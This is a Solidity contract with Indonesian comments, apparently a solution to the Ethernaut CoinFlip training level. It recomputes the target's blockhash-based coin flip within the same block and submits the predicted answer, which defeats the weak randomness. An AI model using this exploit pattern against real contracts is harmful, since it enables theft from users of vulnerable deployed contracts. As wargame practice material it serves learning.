// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 1. Kita definisikan Interface agar kontrak kita tahu cara bicara dengan CoinFlip
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    // 2. Simpan alamat kontrak korban (Instance Address Ethernaut Anda)
    ICoinFlip public victimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimAddress) {
        victimContract = ICoinFlip(_victimAddress);
    }

    // 3. Fungsi untuk menyerang
    function attack() public {
        // --- COPY LOGIKA DARI SOAL ---
        // Tiru cara menghitung blockValue
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // Tiru cara menghitung coinFlip
        uint256 coinFlip = blockValue / FACTOR;
        
        // Tiru cara menentukan side (True/False)
        bool side = coinFlip == 1 ? true : false;
        
        // --- EKSEKUSI ---
        // Karena kita sudah tahu 'side' (jawaban yang benar),
        // kita kirim 'side' tersebut sebagai tebakan kita.
        victimContract.flip(side);
    }
}